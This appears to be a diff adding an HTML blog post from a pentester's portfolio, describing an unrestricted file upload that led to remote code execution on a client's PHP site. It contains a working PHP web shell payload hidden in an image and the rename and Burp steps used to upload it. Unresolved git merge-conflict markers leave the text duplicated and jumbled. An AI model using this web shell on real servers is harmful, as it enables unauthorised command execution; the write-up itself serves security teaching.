@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0" name="viewport">
+
+    <title>Andr0idh4ppi3r </title>
+    <meta content="" name="description">
+    <meta content="" name="keywords">
+
+    <!-- Favicons -->
+
+
+    <!-- Vendor CSS Files -->
+    <link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+    <link href="assets/vendor/font-awesome/css/font-awesome.min.css" rel="stylesheet">
+    <link href="assets/vendor/ionicons/css/ionicons.min.css" rel="stylesheet">
+    <link href="assets/vendor/owl.carousel/assets/owl.carousel.min.css" rel="stylesheet">
+    <link href="assets/vendor/venobox/venobox.css" rel="stylesheet">
+    <script src="https://kit.fontawesome.com/e09a89de7b.js" crossorigin="anonymous"></script>
+
+    <!-- Template Main CSS File -->
+    <link href="assets/css/style.css" rel="stylesheet">
+
+    <!-- =======================================================
+  * Template Name: DevFolio - v2.4.1
+  * Template URL: https://bootstrapmade.com/devfolio-bootstrap-portfolio-html-template/
+  * Author: BootstrapMade.com
+  * License: https://bootstrapmade.com/license/
+  ======================================================== -->
+</head>
+
+<body id="page-top">
+
+    <!-- ======= Header/ Navbar ======= -->
+    <nav class="navbar navbar-dark navbar-expand-md fixed-top" style="background-color: black;">
+        <div class="container">
+            <a class="navbar-brand justify-content-left" href="index.html" style="font-size: 30px;font-weight: bold;">
+                <h3 style="font-weight: bold;color: gray;">$HOME<span id="underscore">_</span>
+                </h3>
+            </a>
+            <button class="navbar-toggler collapsed" type="button" data-toggle="collapse" data-target="#navbarDefault" aria-controls="navbarDefault" aria-expanded="false" aria-label="Toggle navigation">
+    Menu
+  </button>
+            <div class="navbar-collapse collapse justify-content-end" id="navbarDefault">
+                <ul class="navbar-nav">
+                    <li class="nav-item" id="mm1">
+                        <a class="nav-link js-scroll" href="about.html">.about( )</a>
+                    </li>
+                    <li class="nav-item" id="mm2">
+                        <a class="nav-link js-scroll" href="/project.html">.projects( )</a>
+                    </li>
+                    <li class="nav-item" id="mm3">
+                        <a class="nav-link js-scroll" href="/achievments.html">.achievments( )</a>
+                    </li>
+                    <li class="nav-item" id="mm4">
+                        <a class="nav-link js-scroll" href="/blogs.html">.blogs( )</a>
+                    </li>
+                    <li class="nav-item" id="mm5">
+                        <a class="nav-link js-scroll" onclick="return window.scrollTo(0,document.body.scrollHeight);">.contact( )</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+    <div class="transition-swiperight" id="swup">
+        <div class="intro intro-single route bg-image" style="background-image: url(assets/img/overlay-bg.jpg)">
+            <div class="overlay-mf"></div>
+            <div class="intro-content display-table">
+                <div class="table-cell">
+                    <div class="container">
+                        <h2 class="intro-title mb-4">Blog Details</h2>
+
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <main id="main">
+
+            <!-- ======= Blog Single Section ======= -->
+            <section class="blog-wrapper sect-pt4" id="blog" style="background-color: black;color:white;">
+                <div class="container">
+                    <div class="row">
+                        <div class="col-md-12">
+                            <div class="post-box" style="background-color: #444;color: white;">
+                                <div class="post-thumb">
+                                    <img src="assets/img/post-1.jpg" class="img-fluid" alt="">
+                                </div>
+                                <div class="post-meta">
+                                    <h1 class="article-title">Arbitrary File Uploading Leads to Remote Code Execution</h1>
+                                    <ul>
+                                        <li>
+                                            <span class="ion-ios-person"></span>
+                                            <a href="#">CharanRayudu</a>
+                                        </li>
+                                        <li>
+                                            <span class="ion-pricetag"></span>
+                                            <a href="#">Pentest</a>
+<<<<<<< HEAD
+=======
+                                        </li>
+                                        <li>
+                                            <span class="ion-chatbox"></span>
+                                            <a href="#">14</a>
+>>>>>>> 8913ea0a681a15c50f2157784e6b0ac97896b645
+                                        </li>
+                                        
+                                    </ul>
+                                </div>
+                                <div class="article-content" style="color: white;background-color: #444;">
+                                    <p>
+                                        This vulnerability was found during testing on a Private Company which called me for Penetration Testing. The Company is based on the Digital Asset Trading. I have anonymized, altered, or removed  all detail about the company to keep this information confidential in line with pentesting policies.
+<<<<<<< HEAD
+                                    </p>
+                                    <p>
+                                        TL;DR
+                                    </p>
+                                    <p>
+                                        Image file upload functionality doesn’t validate a file extension but validates Content-type and a content of a file. Application sets Content-type of HTTP response based on a file extension. Image, containing PHP code and a file extension set to .php, was uploaded and allowed remote code execution
+                                    </p>
+                                    <p>
+                                        An application had image file upload functionality and was written in PHP. I started testing for <a href="https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload">unrestricted file upload</a>, knowing a good starting point is the OWASP Testing Guide. As always, I read responses from the server, analysed them and got the following information:
+                                    </p>
+                                    <ul>
+                                        <li>
+                                            When a file sent to the server is verified against Content-type and file header, only images are allowed
+                                        </li>
+                                        <li>
+                                            A file can have any extension you like, extension defines Content-type of HTTP response sent by the server
+                                        </li>
+                                        <li>
+                                            The file is transformed by the server
+                                        </li>
+                                        <li>
+                                            The file's metadata is cleared (no EXIF data)
+                                        </li>
+                                        <li>
+                                            During testing the newest version of ImageMagick was used (disclosed in one of HTTP responses sent by the server)
+                                        </li>
+                                    </ul>
+                                    <p>
+                                        As you can see, injecting PHP code in EXIF data did not result in immediate exploitability. At that point I started thinking of next possible step. I knew I was looking for RCE.
+                                    </p>
+                                    <p>
+                                        I reached the following conclusion: <code>If an uploaded image contains PHP code and that code is not modified, and file extension is one of php, then application should execute the file</code>. The challenge here is to find a place in an image where PHP code can be placed. Of course, you can read RFC/specifications and it can be useful. However, it may be difficult to apply that knowledge to a real situation as we don't have access to code and we don't know which part of an RFC can be useful. As I knew what I wanted to achieve, I could create some plan. Usually, if the problem is complex, I use a <code>divide and conquer</code> approach (like the way algorithm works).
+                                    </p>
+                                    <p>
+                                        The plan:
+                                    </p>
+                                    <ol>
+                                    <li>
+                                        Define a list of image file formats.
+                                    </li>
+                                    <li>
+                                        Try to identify transformations made to the image by the server.
+                                    </li>
+                                    <li>
+                                        Recreate the situation (transformations) locally using ImageMagick and PHP code to have a local testing capability.
+                                    </li>
+                                    <li>
+                                        Are there any unmodified spaces in the image file?
+                                    </li>
+                                    <li>
+                                        Yes, go to step 6. No, go to step 1.
+                                    </li>
+                                    <li>
+                                        Inject a code to an identified space and test if the injected code is executed.
+                                    </li>
+                                    </ol>
+                                    <p>
+                                        It can be easily noticed that the plan is just an algorithm.
+                                    </p>
+                                    <p>
+                                        I started with a jpg shell uploading i.e., injecting a Remote Code Execution payload into the jpeg file. This can be done through a EXIF Editor.
+                                    </p>
+                                    <p>
+                                        The payload I injected to the image is
+                                    </p> 
+                                    <iframe src="https://carbon.now.sh/embed?bg=rgba%28171%2C+184%2C+195%2C+1%29&t=cobalt&wt=none&l=text%2Fx-java&ds=true&dsyoff=20px&dsblur=68px&wc=true&wa=true&pv=56px&ph=56px&ln=false&fl=1&fm=Hack&fs=14px&lh=133%25&si=false&es=1x&wm=false&code=%253Cstyle%253Ebody%257Bfont-size%253A0%253B%257Dh1%257Bfont-size%253A12px%257D%253C%252Fstyle%253E%253Ch1%253E%253C%253Fphp%2520if%28isset%28%2524_REQUEST%255B%27cmd%27%255D%29%29%257Bsystem%28%2524_REQUEST%255B%27cmd%27%255D%29%253B%257Delse%257Becho%2520%27RCE%27%253B%257D_half_compiler%28%29%253B%253F%253E%253C%252Fh1%253E"
+                                    style="width: 1024px; height: 222px; border:0; transform: scale(1); overflow:hidden;"
+                                    sandbox="allow-scripts allow-same-origin">
+                                    </iframe>
+                                    <p>
+                                        Now after injecting the payload to the image, Rename the file
+                                    </p>
+                                    <p>
+                                        Initially it was "0.jpg", I made it as "0.php.jpg"
+                                        (which does make it executable since we titled as double extended file)
+                                    </p>
+                                    <p>
+                                        Now , try to upload the file. And intercept the request in burpsuite. Now I got the following request.
+                                    </p>
+                                    <img src=assets/img/rce-1.png alt="">
+                                    <p>
+
+                                    </p>
+                                    <p>
+                                        Then!, with no late I edited the filename as "0.php" and forwarded the request.
+                                    </p>
+                                    <p>
+                                        Now, here when u see that our uploaded file looks like crashed. We can say that here we can find exploit!
+=======
+                                    </p>
+                                    <p>
+                                        TL;DR
+                                    </p>
+                                    <p>
+                                        Image file upload functionality doesn’t validate a file extension but validates Content-type and a content of a file. Application sets Content-type of HTTP response based on a file extension. Image, containing PHP code and a file extension set to .php, was uploaded and allowed remote code execution
+                                    </p>
+                                    <p>
+                                        An application had image file upload functionality and was written in PHP. I started testing for <a href="https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload">unrestricted file upload</a>, knowing a good starting point is the OWASP Testing Guide. As always, I read responses from the server, analysed them and got the following information:
+                                    </p>
+                                    <ul>
+                                        <li>
+                                            When a file sent to the server is verified against Content-type and file header, only images are allowed
+                                        </li>
+                                        <li>
+                                            A file can have any extension you like, extension defines Content-type of HTTP response sent by the server
+                                        </li>
+                                        <li>
+                                            The file is transformed by the server
+                                        </li>
+                                        <li>
+                                            The file's metadata is cleared (no EXIF data)
+                                        </li>
+                                        <li>
+                                            During testing the newest version of ImageMagick was used (disclosed in one of HTTP responses sent by the server)
+                                        </li>
+                                    </ul>
+                                    <p>
+                                        As you can see, injecting PHP code in EXIF data did not result in immediate exploitability. At that point I started thinking of next possible step. I knew I was looking for RCE.
+                                    </p>
+                                    <p>
+                                        I reached the following conclusion: <code>If an uploaded image contains PHP code and that code is not modified, and file extension is one of php, then application should execute the file</code>. The challenge here is to find a place in an image where PHP code can be placed. Of course, you can read RFC/specifications and it can be useful. However, it may be difficult to apply that knowledge to a real situation as we don't have access to code and we don't know which part of an RFC can be useful. As I knew what I wanted to achieve, I could create some plan. Usually, if the problem is complex, I use a <code>divide and conquer</code> approach (like the way algorithm works).
+                                    </p>
+                                    <p>
+                                        The plan:
+                                    </p>
+                                    <ol>
+                                    <li>
+                                        Define a list of image file formats.
+                                    </li>
+                                    <li>
+                                        Try to identify transformations made to the image by the server.
+                                    </li>
+                                    <li>
+                                        Recreate the situation (transformations) locally using ImageMagick and PHP code to have a local testing capability.
+                                    </li>
+                                    <li>
+                                        Are there any unmodified spaces in the image file?
+                                    </li>
+                                    <li>
+                                        Yes, go to step 6. No, go to step 1.
+                                    </li>
+                                    <li>
+                                        Inject a code to an identified space and test if the injected code is executed.
+                                    </li>
+                                    </ol>
+                                    <p>
+                                        It can be easily noticed that the plan is just an algorithm.
+                                    </p>
+                                    <p>
+                                        I started with a jpg shell uploading i.e., injecting a Remote Code Execution payload into the jpeg file. This can be done through a EXIF Editor.
+                                    </p>
+                                    <p>
+                                        The payload I injected to the image is
+                                    </p> 
+                                    <p> 
+                                        <code><style>body{font-size:0;}h1{font-size:12px}</style><h1><?php if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}else{echo 'RCE';}_half_compiler();?></h1></code>
+                                    </p>
+                                    <p>
+                                        Now after injecting the payload to the image, Rename the file
+                                    </p>
+                                    <p>
+                                        Initially it was "0.jpg", I made it as "0.php.jpg"
+                                        (which does make it executable since we titled as double extended file)
+>>>>>>> 8913ea0a681a15c50f2157784e6b0ac97896b645
+                                    </p>
+                                    <img src=assets/img/rce-2.png alt="">
+                                    <p>
+<<<<<<< HEAD
+                                        Next step is to open the uploaded image in new tab which also mean opening image location in the website. As said the url does look like this
+                                        https://example.com/assets/pictures/4f3c3b82e3145809939c2929d98af2b4.php 
+                                    </p>
+                                    <p>
+                                        Now, on a ease add ?cmd= to the url, so it will be as
+                                         https://example.com/assets/pictures/4f3c3b82e3145809939c2929d98af2b4.php?cmd=
+=======
+                                        Now , try to upload the file. And intercept the request in burpsuite. Now I got the following request.
+                                    </p>
+                                    <p>
+                                        Then!, with no late I edited the filename as "0.php" and forwarded the request.
+>>>>>>> 8913ea0a681a15c50f2157784e6b0ac97896b645
+                                    </p>
+                                    <p>
+                                        Finally, we have terminal which means it got exploited.
+                                        As a example, I used "ls -la", and BOOOOOMMMM!!!!!!!!!!!
+                                    </p>
+                                    <img src=assets/img/rce-3.png alt="">
+                                    
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+            <!-- End Blog Single Section -->
+
+        </main>
+    </div>
+    <!-- End #main -->
+
+    <!-- ======= Footer ======= -->
+    <footer class="footer">
+        <div class="title-box text-center" style="margin-bottom: 25px;">
+            <h3 class="title-a" style="color: white;">
+                Contact Me
+            </h3>
+            <div class="line-mf"></div>
+        </div>
+        <div>
+            <div class="contactIcon">
+                <a class="contactIconItem" target="_blank" href="https://www.facebook.com/charan.rayudu/"><i class="fab fa-facebook-f"></i></a>
+                <a class="contactIconItem" target="_blank" href="mailto:charan.rayudu1784@gmail.com"><i class="fas fa-envelope"></i></a>
+                <a class="contactIconItem" target="_blank" href="https://www.linkedin.com/in/rayudusrisaicharan/"><i class="fab fa-linkedin-in"></i></a>
+                <a class="contactIconItem" target="_blank" href="https://github.com/CharanRayudu"><i class="fab fa-github"></i></a>
+            </div>
+        </div>
+    </footer>
+    <!-- End  Footer -->
+
+    <a href="#" class="back-to-top"><i class="fa fa-chevron-up"></i></a>
+    <div id="preloader"></div>
+
+    <!-- Vendor JS Files -->
+    <script src="assets/vendor/jquery/jquery.min.js"></script>
+    <script src="assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+    <script src="assets/vendor/jquery.easing/jquery.easing.min.js"></script>
+    <script src="assets/vendor/php-email-form/validate.js"></script>
+    <script src="assets/vendor/waypoints/jquery.waypoints.min.js"></script>
+    <script src="assets/vendor/counterup/jquery.counterup.min.js"></script>
+    <script src="assets/vendor/owl.carousel/owl.carousel.min.js"></script>
+    <script src="assets/vendor/typed.js/typed.min.js"></script>
+    <script src="assets/vendor/venobox/venobox.min.js"></script>
+    <script src="assets/js/swup.min.js"></script>
+    <!-- Template Main JS File -->
+    <script src="assets/js/main.js"></script>
+
+</body>
+
+</html>
